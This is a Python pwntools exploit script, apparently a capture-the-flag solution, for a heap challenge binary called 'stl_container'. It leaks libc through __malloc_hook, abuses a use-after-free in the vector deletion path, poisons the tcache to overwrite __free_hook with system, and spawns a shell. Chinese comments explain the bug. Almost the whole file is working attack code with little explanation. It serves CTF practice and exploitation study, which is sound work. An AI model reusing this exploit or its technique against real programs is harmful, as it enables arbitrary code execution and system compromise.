# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './stl_container'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add( type, text = 'a'):
    cmd(type)
    cmd(1)
    sla('data:' , text)

def delete( type ,idx = 0):
    cmd(type)
    cmd(2)
    if type <= 2:
        sla('index' , idx)

def show( type ,idx =0):
    cmd(type)
    cmd(3)
    sla('index' , idx)

add( 1 )
add( 1 )
add( 2 )
add( 2 )
add( 4 )
add( 4 )
add( 3 )
add( 3 )

dbg()

delete(3)
delete(3)
delete(1)
delete(1)
delete(4)
delete(4)
delete(2)

#  vector 删除后索引仍在最后一个

show(2)

__malloc_hook = l64() - 0x70
libc.address = __malloc_hook - libc.sym['__malloc_hook']
system_addr = libc.sym['system']
__free_hook = libc.sym['__free_hook']
binsh_addr = libc.search('/bin/sh').next()

add(4)
delete(2)
add(4)

add(2)
add(2)
delete(2)
delete(2)

# 这里是因为 vector 删除时会使用最后一个对象的删除

add(3 , p64(__free_hook - 8))
add(3 , flat( '/bin/sh\x00' , system_addr ))


p.interactive()

'''
@File    :   stl_container.py
@Time    :   2021/10/01 20:08:31
@Author  :   Niyah 
'''